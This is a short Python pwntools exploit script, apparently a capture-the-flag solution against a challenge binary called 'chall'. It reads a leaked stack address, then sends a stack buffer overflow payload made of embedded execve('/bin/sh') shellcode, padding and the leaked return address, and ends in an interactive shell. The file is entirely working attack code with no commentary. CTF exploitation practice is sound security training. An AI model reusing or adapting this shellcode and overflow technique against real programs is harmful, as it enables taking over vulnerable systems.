#!/usr/bin/env python3
from pwn import *

BIN_FILE  = './chall'
LIBC_FILE = ''

HOST = args.HOST or 'localhost'
PORT = int(args.PORT or 1337)

context(os='linux', arch='amd64')
# context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

binf = ELF(BIN_FILE)
libc = ELF(LIBC_FILE) if LIBC_FILE != '' else None

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug(BIN_FILE)
    else:
        return process(BIN_FILE)

def attack(io, **kwargs):
    shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
    io.sendlineafter('>', '1')
    io.recvuntil('[0x')
    leak = int(io.recv(12), 16)
    print(hex(leak))
    io.sendlineafter('>', shellcode + b'a'*(0x48-len(shellcode)) + p64(leak))

def main():
    io = start()
    attack(io)
    io.interactive()

if __name__ == '__main__':
    main()
